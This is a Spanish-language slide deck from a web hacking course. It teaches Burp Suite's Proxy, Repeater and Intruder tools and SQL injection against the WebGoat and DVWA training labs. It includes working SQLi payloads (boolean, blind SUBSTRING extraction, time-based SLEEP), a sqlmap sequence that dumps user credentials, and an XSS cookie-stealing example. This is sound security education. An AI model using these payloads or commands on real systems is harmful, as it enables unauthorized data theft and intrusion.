# Deck — Clase 2 · Módulo 2

> Curso de Web Hacking
> Duración: 2 horas
> Formato: teoría + demos guiadas

---

# Web Hacking
## Módulo 2 — Clase 2
### Burp Suite y SQLi con herramientas profesionales

---

## Recap breve: Clase 1

- Command Injection, File Inclusion, CSRF y SQLi manual
- El problema común: **datos mezclados con instrucciones**
- SQLi básico con UNION SELECT en DVWA
- SQLMap automatiza, pero primero hay que entender la falla
- Contextos de inyección: string vs numérico

> Hoy damos el salto: de curl y navegador a **Burp Suite**, la herramienta estándar de la industria.

---

## ¿Por qué los alumnos quieren Burp ahora?

Feedback real de la clase pasada:
- "¿Cuándo usamos Burp?"
- "Los pentesters profesionales no usan curl para todo"
- "Quiero automatizar ataques, no tipear payloads a mano"

Tenían razón.

**Burp Suite es la navaja suiza del pentesting web**. Y es momento de aprenderla.

---

## Agenda de hoy

| Bloque | Contenido | Tiempo aprox. |
|---|---|---|
| **1** | ¿Qué es Burp Suite y por qué lo usamos? | ~10 min |
| **2** | Setup e interfaz: Proxy, Repeater, Intruder | ~30 min |
| 🧪 | Demo 1: Interceptar y modificar requests | ~15 min |
| **3** | SQLi con Burp en WebGoat | ~35 min |
| 🧪 | Demo 2: Blind SQLi con Intruder | ~20 min |
| **4** | Preview: XSS y próxima clase | ~10 min |

---

## ¿Qué es Burp Suite?

Burp Suite es una **plataforma de análisis de seguridad** orientada a la explotación manual de aplicaciones web.

Su función principal: actuar como **intermediario** entre el navegador y el servidor, permitiendo:
- Inspeccionar tráfico HTTP/HTTPS
- Modificar requests antes de enviarlas
- Repetir y automatizar ataques
- Analizar respuestas del servidor

**Se emplea en:**
- Auditorías de seguridad web
- Pruebas de penetración manuales
- Análisis de lógica de aplicaciones

---

## Burp Suite: Manual vs Automático

> **Burp Suite no "encuentra vulnerabilidades por sí solo"**

Facilita el **razonamiento del analista**.

Tiene escaneo automático (pasivo y activo), pero su valor real está en:
- Interceptar y modificar tráfico en tiempo real
- Repetir requests con variaciones
- Automatizar ataques que **vos diseñás**

No es un "botón mágico". Es una herramienta para pentesters que **entienden** lo que buscan.

---

## Instalación de Burp Suite Community Edition

### Requisitos
- Sistema operativo Windows, Linux o macOS
- Java Runtime (si la versión no lo incluye)

### Proceso
1. Descargar la versión **Community** (gratuita)
2. Ejecutar el instalador o archivo `.jar`
3. Iniciar un **proyecto temporal**
4. Usar la configuración por defecto

**En Kali Linux:** Ya viene preinstalado → menú Applications → Web Application Analysis → Burp Suite

---

## Interfaz de Burp Suite

La interfaz se compone de:
- **Barra de menú** (configuración, scope, extensiones)
- **Pestañas funcionales** (tabs principales)
- **Panel de solicitudes y respuestas**

Cada área está diseñada para una fase del análisis.

---

## Tabs Principales (las que vamos a usar hoy)

| Tab | Para qué sirve |
|-----|----------------|
| **Dashboard** | Centro de control, estado del proyecto |
| **Proxy** | Interceptar y modificar tráfico HTTP/HTTPS |
| **Target** | Definir alcance (scope) de la prueba |
| **Repeater** | Reenviar requests manualmente con modificaciones |
| **Intruder** | Automatizar ataques controlados (fuzzing, fuerza bruta) |

Las que NO vamos a usar hoy (las veremos en M3):
- Decoder, Comparer, Extensions

---

## Dashboard

- Panel central de control de Burp Suite
- Muestra el estado del proyecto activo
- Gestión de extensiones (BApp Store)
- Vista de tareas en ejecución

**Para hoy:** Solo necesitamos saber que existe. La acción está en los otros tabs.

---

## Target (Scope)

- Define **qué aplicaciones o sitios web** forman parte del análisis
- Permite establecer el **alcance (scope)** de la prueba
- Incluye dominios, subdominios, IPs, protocolos y rutas

**¿Por qué importa?**
- El tráfico **dentro del scope** es interceptado y analizado
- El tráfico **fuera del alcance** se filtra o ignora
- Evita ruido (ads, analytics, CDNs)

---

## Proxy: El corazón de Burp

Permite **interceptar, inspeccionar y modificar** tráfico HTTP y WebSocket.

Funciona como un **Man-in-the-Middle controlado** entre navegador y aplicación.

**Funcionalidades clave:**
- Intercepción en tiempo real
- Las peticiones y respuestas pueden analizarse, editarse o descartarse
- Historial de todo el tráfico interceptado
- Reglas automáticas (match and replace)

---

## Proxy: ¿Cómo funciona?

Flujo de comunicación:

```
Navegador → Burp Proxy (intercepción) → Servidor
             ↑
          Modificación
```

1. El navegador envía una solicitud
2. **Burp Suite intercepta** la petición (la detiene temporalmente)
3. El analista puede **modificarla**
4. La solicitud es enviada al servidor
5. La respuesta vuelve a pasar por Burp antes de llegar al navegador

> Este enfoque permite romper la suposición: **"el cliente no alterará los datos enviados"**

---

## Proxy: Configuración del Navegador

Para que el navegador envíe tráfico a Burp:

1. **Configurar proxy en el navegador:**
   - Servidor: `127.0.0.1`
   - Puerto: `8080` (por defecto)

2. **Instalar certificado CA de Burp:**
   - Navegar a `http://burp` con el proxy activado
   - Descargar el certificado CA
   - Importarlo en el navegador (para inspeccionar HTTPS)

**Tip:** En Firefox, usar FoxyProxy para cambiar entre proxy y navegación normal fácilmente.

---

## 🧪 Demo guiada 1 — Interceptar y modificar requests

**Target:** Formulario de login simple en WebGoat

Secuencia:
1. Levantar Burp Suite → tab **Proxy** → activar **Intercept**
2. En el navegador, intentar login con credenciales incorrectas
3. Burp congela la request → la vemos en Proxy → Intercept
4. Modificar parámetros (user, password)
5. Click en **Forward** → enviar al servidor
6. Ver la respuesta en el navegador

**Objetivo:** Entender el flujo de intercepción antes de usarlo para explotar.

---

## Repeater: Reenviar Requests Manualmente

Permite **reenviar manualmente** una petición HTTP con modificaciones.

**Uso típico:**
1. Interceptar una request en Proxy
2. Click derecho → **Send to Repeater**
3. En Repeater, modificar parámetros, headers, método
4. Click en **Send** → ver respuesta inmediatamente
5. Repetir con variaciones

**Ventajas:**
- Separa claramente request y response
- Muestra códigos de estado, encabezados y contenido
- Ideal para **pruebas iterativas** (cambiar payload, ver resultado, ajustar)

---

## Intruder: Automatizar Ataques Controlados

Se utiliza para **automatizar ataques** sobre una petición específica.

**Se emplea principalmente para:**
- Fuerza bruta (credenciales, tokens, IDs)
- Fuzzing (inyectar payloads en múltiples posiciones)
- Validación de entradas (probar caracteres especiales, encoding)

**Flujo:**
1. Enviar request a Intruder (desde Proxy o Repeater)
2. Marcar **positions** (dónde insertar payloads)
3. Cargar **payloads** (wordlists, números, custom)
4. Seleccionar **tipo de ataque** (Sniper, Battering Ram, Pitchfork, Cluster Bomb)
5. Iniciar ataque → analizar respuestas

---

## Intruder: Tipos de Ataque

| Tipo | Descripción | Uso típico |
|------|-------------|------------|
| **Sniper** | Prueba un parámetro a la vez con todos los payloads | Fuzzing puntual, detectar qué campo es vulnerable |
| **Battering Ram** | Usa el mismo payload en todas las posiciones marcadas | Pruebas simples de credenciales |
| **Pitchfork** | Múltiples listas de payloads en paralelo (una por posición) | User:Pass de listas pareadas |
| **Cluster Bomb** | Combina todos los payloads entre sí (producto cartesiano) | Pruebas exhaustivas (lento pero completo) |

**Nota:** Hoy vamos a usar solo **Sniper**, el tipo de ataque más simple.

---

## Intruder: Posiciones (Positions)

Las **positions** indican qué partes de la petición serán modificadas.

**Funciones:**
- **Add**: Agrega manualmente una posición (seleccionar texto → Add §)
- **Clear**: Elimina todas las posiciones
- **Auto**: Detecta automáticamente posibles parámetros atacables

Burp marca las posiciones con `§valor§`:

```http
POST /login HTTP/1.1
...

username=§admin§&password=§test123§
```

---

## SQLi con Burp Suite en WebGoat

Ahora que sabemos usar Burp, volvamos a SQLi.

**¿Por qué Burp para SQLi?**
- Interceptar y modificar **sin editar URL a mano**
- **Repeater** para probar payloads iterativamente
- **Intruder** para blind SQLi (automatizar boolean/time-based)
- Ver respuestas completas (headers, body, timing)

**Target de hoy:** WebGoat → SQL Injection (Advanced)

---

## SQLi en WebGoat: Metodología

1. **Identificar punto de inyección** (campo vulnerable)
2. **Confirmar SQLi** con payload básico (`' OR 1=1--`)
3. **Determinar número de columnas** (UNION SELECT)
4. **Extraer datos** de otras tablas
5. **Documentar** findings

**Con Burp:**
- Proxy → interceptar request del formulario
- Repeater → probar payloads
- Intruder → automatizar extracción (si es blind)

---

## 🧪 Demo guiada 2 — SQLi básico con Repeater

**Target:** WebGoat → SQL Injection (Intro) → String SQL Injection

Pasos:
1. Completar formulario en WebGoat normalmente
2. Interceptar con Burp Proxy
3. Send to Repeater
4. Modificar el parámetro vulnerable:

```sql
name=John' OR '1'='1
```

5. Enviar → analizar respuesta
6. Confirmar bypass de autenticación

---

## Blind SQLi: Boolean-based

A veces no vemos errores ni resultados directos, pero **la respuesta cambia** según la consulta.

**Técnica:** Hacer preguntas Sí/No a la base de datos.

**Lógica:**
- Si la condición inyectada es **verdadera** → respuesta A (ej: "User already exists")
- Si es **falsa** → respuesta B (ej: "User created")

Esa diferencia es nuestro **oráculo booleano**: podemos hacer preguntas de Sí/No a la base de datos.

---

## SUBSTRING(): Nuestra herramienta de extracción

`SUBSTRING(string, posición, largo)` — extrae una porción de un texto.

```sql
SUBSTRING('secretpass', 1, 1)  → 's'
SUBSTRING('secretpass', 2, 1)  → 'e'
SUBSTRING('secretpass', 3, 1)  → 'c'
SUBSTRING('secretpass', 1, 4)  → 'secr'
```

| Parámetro | Qué es | Ejemplo |
|-----------|--------|---------|
| 1º | El string o columna | `password` |
| 2º | Desde qué posición (**empieza en 1**) | `3` = tercer carácter |
| 3º | Cuántos caracteres extraer | `1` = uno solo |

Sinónimos según motor SQL: `SUBSTR()`, `MID()` — hacen lo mismo.

---

## El proceso natural de descubrimiento

Un pentester no va directo a `SUBSTRING`. Sigue estos pasos:

**Paso 1 — Confirmar la inyección:**
```sql
tom' AND 1=1--    → "User already exists"  (TRUE)
tom' AND 1=2--    → no dice que existe       (FALSE)
```
✅ Confirmado: es inyectable y tenemos oráculo booleano.

**Paso 2 — Elegir qué extraer:**
Queremos el password de tom → usamos `SUBSTRING(password, pos, 1)`

**Paso 3 — Iterar carácter por carácter:**
```sql
tom' AND substring(password,1,1)='a'--  → no existe
tom' AND substring(password,1,1)='b'--  → no existe
...
tom' AND substring(password,1,1)='t'--  → "already exists" ✅
```
Primer carácter = `t`. Repetir para posición 2, 3, 4...

**Paso 4 — Automatizar** (demasiado lento a mano → Burp Intruder o Python)

---

## 🧪 Ejercicio WebGoat: Login as Tom

**Target:** WebGoat → SQL Injection (Advanced) → Lesson 4

El formulario de **registro** consulta si el usuario existe:
```sql
SELECT * FROM users WHERE username = '<input>'
```

**Explotación paso a paso:**

| Payload en username | Respuesta | Significado |
|---------------------|-----------|-------------|
| `tom' AND 1=1--` | Already exists | ✅ Inyectable |
| `tom' AND 1=2--` | User created | ✅ Oráculo confirmado |
| `tom' AND substring(password,1,1)='t'--` | Already exists | 1er carácter = `t` |
| `tom' AND substring(password,2,1)='h'--` | Already exists | 2do carácter = `h` |

Con **Burp Intruder (Cluster Bomb)**: posición × carácter → extraés el password completo.

Con el password → login como tom en el formulario normal.

---

## Blind SQLi: Time-based

Cuando **ni siquiera** hay diferencias visibles en la respuesta, medimos **tiempos**.

```sql
' AND IF(database()='app_db', SLEEP(5), 0) --
```

**Lógica:**
- Si tarda ~5 segundos → condición verdadera
- Si responde rápido → condición falsa

Es **lento**, pero funciona incluso cuando no hay output visible.

---

## 🧪 Demo guiada 3 — Blind SQLi con Intruder

**Target:** WebGoat → SQL Injection (Advanced) → Blind Numeric SQL Injection

Pasos:
1. Identificar campo vulnerable (ej: `id`)
2. Interceptar request con Burp
3. Send to Intruder
4. Marcar position en el parámetro `id`
5. En la pestaña Payloads:
   - Tipo: Numbers (1-100)
   - Agregar prefijo: `' AND SLEEP(2)--`
6. Ordenar resultados por **Response received** (timing)
7. Los que tarden ~2 segundos más → inyección exitosa

---

## Intruder: Analizar Resultados

Columnas útiles en la tabla de resultados:

| Columna | Qué indica |
|---------|------------|
| **Status** | Código HTTP (200, 302, 500) |
| **Length** | Tamaño de la respuesta (cambios = comportamiento distinto) |
| **Time (Response received)** | Timing (útil para time-based SQLi) |
| **Payload** | Qué payload se usó |

**Tip:** Ordenar por Length o Time para identificar respuestas anómalas.

---

## SQLMap: automatización con criterio

SQLMap automatiza:
- detección del punto de inyección
- fingerprint del motor DB
- enumeración de bases, tablas y columnas
- extracción de datos
- bypass de WAFs

Estructura base:

```bash
sqlmap -u "http://target/product.php?id=1"
```

Pero automatizar no significa apagar el criterio.

---

## SQLMap: flags esenciales

| Opción | Función |
|---|---|
| `-u URL` | URL con parámetro inyectable |
| `--data="user=x&pass=y"` | POST data |
| `--cookie="PHPSESSID=abc"` | Cookie de sesión |
| `--technique=BEUSTQ` | Técnicas a probar |
| `--level=1-5` | Profundidad de pruebas |
| `--risk=1-3` | Riesgo (1=safe, 3=agresivo) |
| `--batch` | No interactivo |
| `--dbs` | Enumerar bases de datos |
| `-D nombre --tables` | Tablas de una base |
| `-D nombre -T tabla --dump` | Extraer datos |

---

## SQLMap: flujo práctico completo

```bash
# 1. Detectar inyección
sqlmap -u "http://target/page.php?id=1" --batch

# 2. Enumerar bases de datos
sqlmap -u "http://target/page.php?id=1" --dbs --batch

# 3. Enumerar tablas de una base
sqlmap -u "http://target/page.php?id=1" -D webapp --tables --batch

# 4. Extraer columnas
sqlmap -u "http://target/page.php?id=1" -D webapp -T users --columns --batch

# 5. Dump selectivo
sqlmap -u "http://target/page.php?id=1" -D webapp -T users \
  -C "username,password" --dump --batch

# 6. Con POST y cookie
sqlmap -u "http://target/login" --data="user=test&pass=test" \
  --cookie="session=abc123" --level=3 --risk=2 --batch
```

---

## SQLMap: buenas prácticas

1. **Confirmar manualmente antes** — si no entendés la falla, SQLMap tampoco la va a explicar
2. **Empezar con level=1, risk=1** — subir solo si no detecta
3. **Extraer solo lo necesario** — `--dump` sin filtros puede tardar horas
4. **Guardar evidencia** — usar `--output-dir`
5. **No usar en producción sin autorización** — genera cientos de requests ruidosos

---

## Comparación: Manual vs Burp

| Tarea | Manual (curl/navegador) | Con Burp Suite |
|-------|-------------------------|----------------|
| Probar 1 payload | Tipear URL/parámetro | Repeater: modificar y Send |
| Probar 100 payloads | Scripting o copy-paste | Intruder: cargar wordlist, ejecutar |
| Interceptar HTTPS | Complejo (mitmproxy, config) | Instalás certificado y listo |
| Ver request/response completos | `curl -v` parsear output | UI limpia, tabs separados |
| Repetir con modificaciones | Editar comando completo | Modificar campo específico |

---

## XSS: Preview de la Próxima Clase

**Cross-Site Scripting (XSS)** ocurre cuando una aplicación permite que contenido controlado por un atacante sea **interpretado por el navegador** de otra persona.

**El problema:** No distinguir entre datos legítimos y código ejecutable.

**Tipos:**
- **Reflected XSS**: El payload se refleja inmediatamente en la respuesta
- **Stored XSS**: El payload se almacena (DB, archivo) y afecta a múltiples víctimas
- **DOM XSS**: La vulnerabilidad está en el JavaScript del cliente

---

## XSS: Un Ejemplo Rápido

Código vulnerable:

```php
<?php
echo "<p>Hola " . $_GET["nombre"] . "</p>";
?>
```

URL maliciosa:

```
http://sitio.com/saludo.php?nombre=<script>alert(document.cookie)</script>
```

Output en el navegador:

```html
<p>Hola <script>alert(document.cookie)</script></p>
```

El navegador **ejecuta** el script. El atacante puede robar cookies, sesiones, o redirigir a phishing.

---

## XSS con Burp Suite

**¿Por qué Burp para XSS?**
- Interceptar y modificar **headers y body** (no solo URL)
- Probar payloads en múltiples contextos (HTML, atributo, JavaScript)
- Intruder para **fuzzing de filtros** (bypass de blacklists)
- Repeater para refinar payloads iterativamente

**Próxima clase:**
- XSS reflected, stored y DOM en detalle
- Bypass de filtros y WAFs
- BeEF Framework: Control del navegador de la víctima tras explotar XSS

---

## Resumen de lo aprendido

- **Burp Suite** es el proxy interceptor estándar de la industria
- Configuración: proxy en navegador + certificado CA
- **Proxy** para interceptar, **Repeater** para iterar, **Intruder** para automatizar
- SQLi con Burp: Repeater para payloads manuales, Intruder para blind SQLi
- Blind SQLi boolean y time-based: extraer datos sin output directo
- XSS es el siguiente tema (lo profundizamos próxima clase)

---

## Próxima clase

**Módulo 2 — Clase 3:**
- XSS Reflected, Stored y DOM en profundidad
- Contextos de ejecución y payloads específicos
- Bypass de filtros y encoding
- BeEF: Framework de explotación del navegador
- Proyecto integrador del Módulo 2

---

## Gracias

**¿Preguntas?**

Recuerden practicar en WebGoat y DVWA.

Burp Suite es una herramienta **que se aprende usándola**.

Nos vemos la próxima clase 🚀
